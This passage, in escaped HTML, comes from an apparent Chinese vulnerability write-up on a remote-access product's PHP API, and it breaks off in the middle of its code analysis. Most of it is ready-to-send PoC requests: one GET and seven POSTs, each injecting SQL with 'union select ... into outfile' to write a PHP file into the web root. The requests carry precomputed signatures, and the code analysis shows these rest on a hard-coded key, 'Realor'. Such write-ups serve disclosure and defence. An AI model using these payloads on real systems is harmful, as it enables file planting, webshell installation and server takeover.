$result = mysql_query(&amp;#34;select * from cuser where name=&amp;#39;&amp;#34; . $account . &amp;#34;&amp;#39;&amp;#34;, $DSCon);
&lt;/code>&lt;/pre>&lt;p>PoC&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>GET &lt;span style="color:#f92672">/&lt;/span>index.php&lt;span style="color:#f92672">/&lt;/span>Index&lt;span style="color:#f92672">/&lt;/span>dologin&lt;span style="color:#f92672">?&lt;/span>name&lt;span style="color:#f92672">=&lt;/span>aa&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>);SELECT&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">22&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>C&lt;span style="color:#f92672">?&lt;/span>php&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>phpinfo();&lt;span style="color:#f92672">?%&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>E&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">22&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>into&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>outfile&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">22.&lt;/span>.&lt;span style="color:#f92672">/&lt;/span>..&lt;span style="color:#f92672">/&lt;/span>WebRoot&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.&lt;/span>php&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">22&lt;/span>;&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> HTTP&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cache&lt;span style="color:#f92672">-&lt;/span>Control: no&lt;span style="color:#f92672">-&lt;/span>cache
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User&lt;span style="color:#f92672">-&lt;/span>Agent: sqlmap&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.5.8&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span>&lt;span style="color:#a6e22e">stable&lt;/span> (http:&lt;span style="color:#75715e">//sqlmap.org)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>Cookie: PHPSESSID&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>mnhgqk6af1nmoqglg9sqfvek2;think_language&lt;span style="color:#f92672">=&lt;/span>zh&lt;span style="color:#f92672">-&lt;/span>cn
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host: &lt;span style="color:#ae81ff">192.168.60.135&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept: &lt;span style="color:#960050;background-color:#1e0010">*/&lt;/span>&lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">-&lt;/span>Encoding: gzip, deflate
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection: close
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最新版poc&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /ConsoleExternalApi.XGI?initParams=command_createUser&amp;amp;key=inner&amp;amp;sign=8b21270d796c45333f88f7db36ed9dbe &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cache-Control&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">no-cache&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">sqlmap/1.5.8#stable (http://sqlmap.org)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.60.135&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">*/*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Encoding&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">170&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;account&amp;#34;:&amp;#34;aaa&amp;#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\&amp;#34;&amp;lt;?php phpinfo();?&amp;gt;\&amp;#34; into outfile \&amp;#34;../../WebRoot/1.php\&amp;#34;;#&amp;#34;,&amp;#34;userPwd&amp;#34;:&amp;#34;aa&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /ConsoleExternalApi.XGI?initParams=command_importUsers&amp;amp;key=inner&amp;amp;sign=ec7e8f5769c2455b773600c2912216fd &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cache-Control&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">no-cache&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">sqlmap/1.5.8#stable (http://sqlmap.org)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.60.135&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">*/*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Encoding&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">183&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;users&amp;#34;:[{&amp;#34;account&amp;#34;:&amp;#34;aaa&amp;#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\&amp;#34;&amp;lt;?php phpinfo();?&amp;gt;\&amp;#34; into outfile \&amp;#34;../../WebRoot/1.php\&amp;#34;;#&amp;#34;,&amp;#34;userPwd&amp;#34;:&amp;#34;bbb&amp;#34;}]}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /ConsoleExternalApi.XGI?initParams=command_editUser__userId_usr00000010&amp;amp;key=inner&amp;amp;sign=dd1d23cb85d99349f2ab003c73df331f &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cache-Control&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">no-cache&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">sqlmap/1.5.8#stable (http://sqlmap.org)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.60.135&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">*/*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Encoding&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">174&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;userGroupId&amp;#34;:&amp;#34;aa&amp;#34;,&amp;#34;account&amp;#34;:&amp;#34;aaa&amp;#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\&amp;#34;&amp;lt;?php phpinfo();?&amp;gt;\&amp;#34; into outfile \&amp;#34;../../WebRoot/1.php\&amp;#34;;#&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /ConsoleExternalApi.XGI?initParams=command_allocatedPointsToServer&amp;amp;key=inner&amp;amp;sign=a3efd6862f5d11319c6de783b58ff04a &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cache-Control&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">no-cache&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">sqlmap/1.5.8#stable (http://sqlmap.org)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.60.135&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">*/*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Encoding&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">142&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;serverId&amp;#34;:&amp;#34;aa&amp;#39; union select 0,0,\&amp;#34;&amp;lt;?php phpinfo();?&amp;gt;\&amp;#34; into outfile \&amp;#34;../../WebRoot/1.php\&amp;#34;;#&amp;#34;,&amp;#34;pointNUm&amp;#34;:&amp;#34;aaa&amp;#34;,&amp;#34;maximumConcurrentNUm&amp;#34;:&amp;#34;aa&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /ConsoleExternalApi.XGI?initParams=command_getServerIpPort&amp;amp;key=inner&amp;amp;sign=94c4e967c00cb6da510b6a5e4e3c3fcc &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cache-Control&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">no-cache&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">sqlmap/1.5.8#stable (http://sqlmap.org)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.60.135&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">*/*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Encoding&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">89&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;iP&amp;#34;:&amp;#34;aa&amp;#39; union select 0,\&amp;#34;&amp;lt;?php phpinfo();?&amp;gt;\&amp;#34; into outfile \&amp;#34;../../WebRoot/1.php\&amp;#34;;#&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /ConsoleExternalApi.XGI?initParams=command_publishApp&amp;amp;key=inner&amp;amp;sign=74ed1f0c20a444c561294b4939b206dc &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cache-Control&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">no-cache&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">sqlmap/1.5.8#stable (http://sqlmap.org)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.60.135&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">*/*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Encoding&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;name&amp;#34;:&amp;#34;aa&amp;#39; union select \&amp;#34;&amp;lt;?php phpinfo();?&amp;gt;\&amp;#34; into outfile \&amp;#34;../../WebRoot/1.php\&amp;#34;;#&amp;#34;,&amp;#34;type&amp;#34;:&amp;#34;a&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /ConsoleExternalApi.XGI?initParams=command_editApp__appId_APP00000002&amp;amp;key=inner&amp;amp;sign=f25574d747ffbbd51496015d25438fa9 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cache-Control&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">no-cache&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">sqlmap/1.5.8#stable (http://sqlmap.org)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.60.135&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">*/*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Encoding&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">223&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;name&amp;#34;:&amp;#34;aa&amp;#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\&amp;#34;&amp;lt;?php phpinfo();?&amp;gt;\&amp;#34; into outfile \&amp;#34;../../WebRoot/1.php\&amp;#34;;#&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>代码逻辑：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 传入参数initParams key sign
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>$initparams &lt;span style="color:#f92672">=&lt;/span> $_REQUEST[&lt;span style="color:#e6db74">&amp;#39;initParams&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$key &lt;span style="color:#f92672">=&lt;/span> $_REQUEST[&lt;span style="color:#e6db74">&amp;#39;key&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$sign &lt;span style="color:#f92672">=&lt;/span> $_REQUEST[&lt;span style="color:#e6db74">&amp;#39;sign&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 两个下划线分割$initparams，变成一个数组
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>$paramArr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">explode&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;__&amp;#34;&lt;/span>, $initparams);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 设置key inner
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> ($key &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;wusuokey&amp;#34;&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $keyVal &lt;span style="color:#f92672">=&lt;/span> $COMCASWEB&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">getfarminfo&lt;/span>($key);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> ($key &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;inner&amp;#34;&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $keyVal &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Realor&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">isset&lt;/span>($keyVal) &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#66d9ef">empty&lt;/span>($keyVal)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write_log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;{&amp;#39;参数非法&amp;#39;:&amp;#39;key值为空&amp;#39;}&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exitErrorJson&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;参数非法&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$signCalculate &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">md5&lt;/span>($initparams &lt;span style="color:#f92672">.&lt;/span> $keyVal);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//testLog(&amp;#34;signCalculate=&amp;#34; . $signCalculate);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> ($signCalculate &lt;span style="color:#f92672">!=&lt;/span> $sign) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write_log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;{&amp;#39;参数非法&amp;#39;:&amp;#39;参数加密方法错误&amp;#39;}&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exitErrorJson&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;参数非法&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$requestObj &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//testLog($paramArr);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// command_createuser
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 遍历数组，将数组的每一项通过_分割，变成键值对
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">foreach&lt;/span> ($paramArr &lt;span style="color:#66d9ef">as&lt;/span> $key &lt;span style="color:#f92672">=&amp;gt;&lt;/span> $value) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $keyValue &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">explode&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;_&amp;#34;&lt;/span>, $value);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $requestObj[$keyValue[&lt;span style="color:#ae81ff">0&lt;/span>]] &lt;span style="color:#f92672">=&lt;/span> $keyValue[&lt;span style="color:#ae81ff">1&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 获取command对应的值
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>$cmd &lt;span style="color:#f92672">=&lt;/span> $requestObj[&lt;span style="color:#e6db74">&amp;#39;command&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
